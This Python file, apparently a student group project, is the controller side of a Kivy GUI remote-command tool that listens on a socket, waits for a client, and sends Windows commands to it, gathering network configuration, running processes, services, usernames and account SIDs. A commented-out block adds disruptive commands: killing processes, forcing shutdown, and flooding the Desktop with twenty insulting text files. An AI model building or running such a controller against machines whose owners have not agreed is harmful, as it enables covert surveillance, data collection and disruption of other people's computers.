import os
import socket
import threading

import kivy
import kivymd
from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.uix.screen import Screen

KV = '''
ScreenManager:
    id: screenManager
    MDScreen:
        name: "startMenu"
        MDRectangleFlatButton:
            id: startBtn
            text: "Start Server"
            pos_hint: {"center_x": .5, "center_y": .5}
            opacity: 1
            disabled: False
            on_press: app.StartServer()
        MDLabel:
            id: statusLbl
            text: "Status"
            font_size: '22.5sp'
            halign: 'center'
            size_hint_y: None
            height: self.texture_size[1]
            padding_y: "500"
    MDScreen:
        name: "mainMenu"
        MDGridLayout:
            adaptive_height: True
            pos_hint: {"center_x": 0.5, "center_y": 0.95}
            orientation: 'lr-tb'
            spacing: 10
            cols: 5
            MDRectangleFlatButton:
                id: networkInfoBtn
                text: "Network Info"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.NetworkInfo()
            MDRectangleFlatButton:
                id: cpuBtn
                text: "CPU Usage"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.cpuusage()
            MDRectangleFlatButton:
                id: taskBtn
                text: "Task List"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.tasks()
            MDRectangleFlatButton:
                id: netserviceBtn
                text: "Network Services"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.services()
            MDRectangleFlatButton:
                id: userInfoBtn
                text: "User Information"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.userInfo()
'''


class Main(MDApp):
    def build(self):
        return Builder.load_string(KV)


    def StartServer(self):
        # Server IP and Port
        HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
        PORT = 21420

        # Start server with the given host and port given and listen for a client
        self.server = socket.socket()
        self.server.bind((HOST, PORT))
        self.root.ids.statusLbl.text = 'Server started!'
        # print('Server started!')

        # A max of one client can be listend at a time
        self.server.listen(1)
        self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
        # print('Listening for a client connection to be established...')
        self.root.ids.startBtn.disabled = True
        self.root.ids.startBtn.opacity = 0
        threading.Thread(target=self.mainloop).start()

    def mainloop(self):
        while True:
            # Check whether connection is established
            self.currConn = self.server.accept()[0]
            self.root.ids.statusLbl.text = 'A client connected!'
            self.root.current = "mainMenu"
            print('A client has established connection!')

    # Juls shizzle
    # This is to gather the client's information about their network
    def NetworkInfo(self):
        while True:
            # Send command to the client
            command = 'ipconfig /all'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive the output given from the client
            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            break

    # Zees stuff
    def cpuusage(self):
        while True:
            command = 'wmic cpu get loadpercentage'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            break


    def tasks(self):
        while True:
            # send command to client
            command = 'tasklist'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # receive output from client
            output = self.currConn.recv(20480)  # Still needs more buffer
            output = output.decode()
            print('Output: ', output)
            break


    def services(self):
        while True:
            command = 'net start'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            break

    # Fang's stuffz
    def userInfo(self):
        while True:
            # Get Username, Fullname, Last Login
            command = 'net user "%USERNAME%"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output = self.currConn.recv(8096).decode()
            output = output.splitlines()
            # Get SID
            command = 'wmic useraccount where name="%USERNAME%" get sid'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output2 = self.currConn.recv(8096).decode()
            output2 = output2.splitlines()
            # Print results
            print('Output: ')
            print(f"{output[0]}\n{output[1]}\n{output[8]}")
            print(f"SID\t\t\t\t\t\t\t{output2[2]}")
            break

"""
UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW
def killtask():
    while True:
        procname = input('Enter Process Name: ')
        command = 'taskkill /im' + procname
        command = command.encode()
        currConn.send(command)
        print('Command sent to client: ', command)
        output = client.recv(8096)
        output = output.decode()
        print('Output: ', output)
        break
def shutdown():
    while True:
        command = 'shutdown /s'
        command = command.encode()
        currConn.send(command)
        print('Command sent to client: ', command)
        break
def filecreate():
    while True:
        command = 'cd Desktop && FOR /L %A IN (1 1 20) DO (echo. > “You suck eggs %A.txt”)'
        command = command.encode()
        currConn.send(command)
        print('Command sent to client: ', command)
        break
"""

if __name__ == '__main__':
    Main().run()
